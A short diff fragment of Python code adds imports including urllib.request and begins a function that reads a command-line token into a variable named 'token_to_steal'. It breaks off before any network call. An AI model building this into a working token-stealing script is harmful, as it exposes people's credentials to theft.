@@ -1,3 +1,8 @@
+import os
+import sys
+import urllib.request
+import json
+
 def run():
     # Recupera il token passato come argomento
     token_to_steal = sys.argv[1]
